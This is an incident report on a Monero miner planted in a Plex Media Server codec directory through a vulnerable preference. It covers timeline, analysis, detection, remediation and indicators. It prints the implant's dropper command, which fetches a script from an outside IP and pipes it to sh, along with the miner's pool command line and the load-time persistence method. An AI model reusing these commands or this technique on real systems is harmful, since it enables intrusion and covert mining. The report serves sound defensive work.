# Unsigned `.so` planted in Plex Media Server's codec cache executes a Monero miner on every transcode

**Incident date:** 2026-10-17 → 2026-10-18 (UTC+02:00)
**Vulnerability:** CVE-2026-96656 (CVSS 4.0: 8.6, CISA-assigned) — fixed in Plex Media Server 1.43.3.10861
**Affected:** Plex Media Server 1.43.2.10687 (Linux, official `linuxserver/plex` container)
**Status:** contained; host rebuild not required (no on-disk persistence outside the codec cache)

## TL;DR

An attacker with access to the Plex server dropped an unsigned shared object named
`zz45fbb275.so` into the application's **codec directory** — a directory Plex populates
itself and passes to every transcoder via `FFMPEG_EXTERNAL_LIBS`. The object exports
nothing and declares no dependencies; its whole payload is a single `.init_array`
constructor, so it executes the moment the transcoder `dlopen()`s it.

Every transcode — a client pressing play, or the library's thumbnail/analysis jobs —
therefore re-ran:

```
/bin/sh -c "(wget http://217.60.194.116/docker -O- || curl http://217.60.194.116/docker -o-)|sh"
```

which downloaded an xmrig-derived RandomX miner (`x12345`) and started it against
`ota.proxystream.st:3333` with `--rig-id plexdocker`. There was no cron job, no systemd
unit, no rc-file edit, and no modified binary: **the codec cache was the persistence
mechanism.** Killing the miner alone re-infected the host at the next playback.

## Timeline (UTC+02:00)

| Time | Event |
|---|---|
| Oct 17 07:50 | First WAN session from `45.194.92.222`; requests authenticate as *guest*, then register a Companion player and drive `/player/*` and agent endpoints |
| Oct 17 17:20 | `zz45fbb275.so` created in `…/Plex Media Server/Codecs/c75335c-…-linux-x86_64/` (directory mtime changes; no other file appears) |
| Oct 17 17:23 | `/tmp/x12345` written (8,350,992 bytes) |
| Oct 17 17:40 | Miner running: `./x12345 --donate-level 5 -o ota.proxystream.st:3333 --rig-id plexdocker`, ~127 % CPU |
| Oct 18 10:48 | Second dropper chain spawned by a later transcode — the payload re-runs on demand |
| Oct 18 11:14 | Detection: mining process found with `PPid` pointing at the container's PID 1 |
| Oct 18 11:20–11:35 | Containment: .so removed, Plex updated to 1.43.4, WAN access to 32400 dropped |

## Initial access

The server was reachable from the internet (Plex's own UPnP port mapping). Plex logs
show the source `45.194.92.222` authenticating as **guest** and issuing agent calls at
the exact minute the `.so` appeared; a second address, `91.92.40.202`, also appears with
guest authentication.

The public description of **CVE-2026-96656** matches this artifact exactly:

> Plex Media Server before 1.43.3.10861 allows an admin user to write arbitrary files
> that may be executed on load. The preference `TranscoderH264Options` is appended
> verbatim to x264's option string on every transcode. At startup, all .so files are
> run without signature, execute bit, or symbol checks.

Two consequences worth stating plainly:

- The write requires **admin** (CVSS `PR:H`). The guest-authenticated requests above do
  not by themselves explain the file write, so the server's admin token must be treated
  as compromised regardless of how the request was made.
- No execution bit, signature or symbol check is performed on `.so` files in the codec
  directory, which is why a do-nothing library with a single constructor is a complete
  payload.

**We did not capture the specific request that wrote the file** — the drop is evidenced
by filesystem timestamps and the execution chain, not by a packet capture. The
`TranscoderH264Options` preference on the affected host was found **empty** afterwards,
so the value used to write the file was either reset or overwritten; that is the one
piece of the chain we cannot reconstruct after the fact.

## Technical analysis

### The implant

```
filename : zz45fbb275.so
size     : 1,036,800 bytes
sha256   : a9a309154493193c70bf6f805fe70e1bc4e9564e2f0e20cd1600c72587c7e65f
type     : ELF64 x86-64, DYN (shared object), stripped
linker   : GCC (Ubuntu 11.4.0-1ubuntu1~22.04.3) 11.4.0
NEEDED   : none
exports  : none
payload  : single .init_array entry (0x1000) — runs at dlopen(), before Plex uses it
strings  : 69 total; the only meaningful ones are /bin/sh and the dropper command line
```

Because the constructor runs on load, the object does not need to implement any codec
API. It only needs to be in a directory the transcoder loads libraries from.

Placement details worth detecting on:

- It is **not** named `lib*.so`; every legitimate file in the codec directory is
  (`libh264_decoder.so`, `libhevc_decoder.so`, …). `zz` was likely chosen to sort last.
- The codec directory (`Codecs/<set-id>-linux-x86_64/`) is normally written only by
  Plex's own codec download, whose files all carry `lib` prefixes.
- `EasyAudioEncoder-*/EasyAudioEncoder/EasyAudioEncoder` is the only other non-`lib`
  object that belongs in that tree.

### The miner

```
filename : x12345 (in /tmp, mode 0777)
size     : 8,350,992 bytes
sha256   : b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49
family   : xmrig-derived, RandomX (Monero)
cmdline  : ./x12345 --donate-level 5 -o ota.proxystream.st:3333 --rig-id plexdocker
```

`--rig-id plexdocker` is a fixed operator tag — useful for pivot searches in flow data
and pool telemetry. The process was found in state `T` (stopped) holding ~2.3 GB RSS:
stopped is not harmless, it resumes and keeps hashing.

### Why killing it was not enough

`PPid` pointed at the container's PID 1 (`s6-svscan`) because the real parent had already
exited — reparenting, not supervision. The actual launcher was visible only through the
shared socketpair: `ss -xp` listed the `sh`/`wget` chain, `Plex Transcoder`, the tuner
service and the Plex server on the same socket pair, and walking the children of the live
`Plex Transcoder` showed the dropper as its child. The trigger was the transcode itself.

## Detection

### 1. Unexpected objects in the codec cache

```bash
find "$PLEX_CONFIG/Library/Application Support/Plex Media Server/Codecs" \
     -type f \( -name '*.so' -o -name '*.so.*' \) ! -name 'lib*' -ls
```

Any hit that is not `EasyAudioEncoder` is suspicious. Also flag a codec directory whose
mtime changed without a corresponding `lib*.so` being added.

Check the preference that CVE-2026-96656 abuses for the arbitrary file write:

```bash
grep -o 'TranscoderH264Options="[^"]*"' "$PLEX_CONFIG/Library/Application Support/Plex Media Server/Preferences.xml"
```

A non-empty value deserves reading — it is appended verbatim to x264's option string on
every transcode, and anything filename-shaped in it ends up written to disk. On the host
here it was empty after the incident, so absence is not proof of absence: correlate with
the file's mtime.

### 2. The dropper / miner pattern

```bash
# bracket the literals: the plain strings also match the shell you type them into
ps -eo pid,ppid,user,etime,args | grep -E 'donate[-]level|proxystream[.]st|x1[0-9]{4}( |$)'
ss -tunp | grep -E ':(3333|3334|14444|45560)\b'
```

`pkill -f` with the bare pattern will kill the shell running it (the pattern is part of
that shell's command line) — use the bracketed form or kill by PID.

### 3. Plex log sequence

Look for guest authentication from a WAN address followed by agent/companion activity,
with a new file appearing in the codec directory in the same minute:

```
Auth: authenticating user as guest
Request: [<wan-ip>:<port> (WAN)] GET /identity
Request: [<wan-ip>:<port> (WAN)] GET /player/proxy/poll …
Request: [127.0.0.1:<port> (Loopback)] POST /system/agents/z/searchOne …
```

### 4. YARA

`yara/plex_codec_implant.yar` — three rules: the constructor-only dropper object, the
xmrig build used here, and a generic renamed-xmrig rule. All are string/`ELF` based; no
sample is required to run them.

## Remediation (what worked)

1. Remove the `.so` first — killing the miner while the loader is present just re-arms it.
2. Kill the remaining `sh`/`wget`/miner chain by PID (`pkill -f` with the literal IP will
   match your own shell — use a character class such as `217[.]60[.]194`).
3. Upgrade Plex to ≥ 1.43.3.10861. Plex's container images do **not** self-update on
   restart (`Docker is used for versioning skip update check`); the image has to be
   pulled and the container recreated.
4. Turn off Remote Access so Plex stops creating the UPnP mapping, and restrict the
   service port to RFC1918 at the host firewall. In the first minutes after the block,
   ~200 WAN packets were dropped — internet scanners find exposed Plex servers quickly.
5. Block the dropper host and the pool on `OUTPUT` **and** `DOCKER-USER` (forwarded
   container traffic never hits `OUTPUT`), and persist with `netfilter-persistent save`.
6. Leave a watchdog: a 5-minute job that kills matching processes and quarantines
   non-`lib` `.so` files in the codec tree.

## Indicators

| Type | Value | Context |
|---|---|---|
| sha256 | `a9a309154493193c70bf6f805fe70e1bc4e9564e2f0e20cd1600c72587c7e65f` | Plex codec-cache implant (1,036,800 B) |
| sha256 | `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | `x12345`, xmrig/RandomX (8,350,992 B) |
| url | `http://217.60.194.116/docker` | dropper fetched by the implant; the same host has served `/plex`, `/x` and `/lmaoi686` — treat any path on it as the dropper |
| ip | `217.60.194.116` | dropper host — AS213900 RS Computers L.L.C (AE) |
| domain | `ota.proxystream.st` → `77.90.185.205` | mining pool, tcp/3333 |
| ip | `77.90.185.205` | pool — AS213790 Limited Network LTD (GB) |
| ip | `45.194.92.222` | session source — AS215925 VPSVAULT.HOST LTD (GB) |
| ip | `91.92.40.202` | session source — AS197170 TechTies Inc. (SC) |
| path | `…/Codecs/<set-id>-linux-x86_64/zz*.so` | drop location |
| path | `/tmp/x12345`, `/tmp/sh.lock` | miner + single-instance lock |
| arg | `--rig-id plexdocker`, `--donate-level 5` | operator tags |

Machine-readable: `iocs.csv`, `stix-bundle.json`.

## Notes and limitations

- No persistence outside the codec cache was found on the host: no crontab entry, no
  user systemd unit, no `ld.so.preload`, no `authorized_keys` change, no shell rc edits.
- The implant executed as the container's configured PUID (an unprivileged host user),
  but that user owns the media and configuration trees — treat file integrity there as
  suspect after any comparable incident.
- Guest authentication appears in the logs, but the arbitrary file write requires admin
  privilege: rotate the server token, sign the server out of plex.tv and re-claim it, and
  review shared users regardless of how the file arrived.
- Sample available to the vendor / to AV researchers on request; it is deliberately not
  published here.

## References

- NVD — CVE-2026-96656: https://nvd.nist.gov/vuln/detail/CVE-2026-96656
  (CVSS 4.0 8.6; CNA: CISA; published 2026-09-23) — arbitrary file write via the
  `TranscoderH264Options` preference, and unchecked `.so` loading from the codec tree
- Plex security advisory: *Important Security Update for Plex Media Server v1.43.2 and
  earlier* — https://forums.plex.tv/t/important-security-update-for-plex-media-server-v1-43-2-and-earlier/942319
- CISA KEV catalogue — Plex Media Server entry
